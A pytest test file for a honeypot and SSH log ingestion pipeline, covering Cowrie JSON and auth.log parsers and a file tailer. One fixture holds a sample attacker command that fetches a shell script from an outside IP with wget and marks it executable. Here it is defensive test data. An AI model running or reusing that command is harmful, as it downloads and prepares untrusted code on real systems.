import os
import json
import pytest
from app.ingestion.cowrie_parser import CowrieLogParser
from app.ingestion.auth_log_parser import AuthLogParser
from app.ingestion.file_tailer import IncrementalFileTailer
from app.ingestion.base import NormalizedEvent

def test_cowrie_json_parser_normal():
    parser = CowrieLogParser()
    sample_json = json.dumps({
        "eventid": "cowrie.command.input",
        "timestamp": "2026-10-29T10:15:30.123456Z",
        "src_ip": "193.142.146.210",
        "dst_port": 2222,
        "protocol": "ssh",
        "username": "root",
        "input": "wget http://185.220.101.5/bot.sh && chmod +x bot.sh",
        "session": "sess-abc12345"
    })

    event = parser.parse_line(sample_json)
    assert event is not None
    assert event.event_id == "cowrie.command.input"
    assert event.src_ip == "193.142.146.210"
    assert event.dst_port == 2222
    assert event.protocol == "SSH"
    assert event.username == "root"
    assert "wget" in event.command
    assert event.severity == "critical"
    assert event.is_simulated is False
    assert event.data_source == "cowrie"
    assert event.event_hash is not None

def test_cowrie_json_parser_malformed():
    parser = CowrieLogParser()
    assert parser.parse_line("") is None
    assert parser.parse_line("   ") is None
    assert parser.parse_line("{invalid json line") is None
    assert parser.parse_line("12345") is None

def test_cowrie_file_download_and_login_events():
    parser = CowrieLogParser()
    dl_line = json.dumps({
        "eventid": "cowrie.session.file_download",
        "timestamp": "2026-10-29T10:20:00Z",
        "src_ip": "185.220.101.5",
        "shasum": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "outfile": "bot.sh"
    })
    ev_dl = parser.parse_line(dl_line)
    assert ev_dl.severity == "critical"
    assert ev_dl.file_hash == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    login_fail = json.dumps({
        "eventid": "cowrie.login.failed",
        "timestamp": "2026-10-29T10:21:00Z",
        "src_ip": "45.154.255.88",
        "username": "admin",
        "password": "password123"
    })
    ev_fail = parser.parse_line(login_fail)
    assert ev_fail.severity == "low"
    assert ev_fail.password == "password123"

def test_auth_log_parser():
    parser = AuthLogParser()
    line_fail = "Oct 29 10:15:30 soc-gw sshd[9876]: Failed password for invalid user hacker from 104.244.76.13 port 54321 ssh2"
    ev = parser.parse_line(line_fail)
    assert ev is not None
    assert ev.event_id == "auth.login.failed"
    assert ev.src_ip == "104.244.76.13"
    assert ev.username == "hacker"
    assert ev.dst_port == 54321

def test_incremental_file_tailer(tmp_path):
    log_file = tmp_path / "test_cowrie.json"
    ckpt_file = tmp_path / "test_cowrie.json.checkpoint"
    tailer = IncrementalFileTailer(str(log_file), str(ckpt_file))

    # Initial state: file does not exist yet
    assert tailer.read_new_lines() == []

    # Write 2 lines
    log_file.write_text('{"eventid":"line1"}\n{"eventid":"line2"}\n', encoding="utf-8")
    lines1 = tailer.read_new_lines()
    assert len(lines1) == 2
    assert "line1" in lines1[0]
    assert "line2" in lines1[1]

    # Read again without modifications -> should return empty
    lines2 = tailer.read_new_lines()
    assert len(lines2) == 0

    # Append 1 new line
    with open(str(log_file), "a", encoding="utf-8") as f:
        f.write('{"eventid":"line3"}\n')

    lines3 = tailer.read_new_lines()
    assert len(lines3) == 1
    assert "line3" in lines3[0]

    # Test file rotation: write new smaller file
    log_file.write_text('{"eventid":"rotated_line1"}\n', encoding="utf-8")
    lines_rot = tailer.read_new_lines()
    assert len(lines_rot) == 1
    assert "rotated_line1" in lines_rot[0]
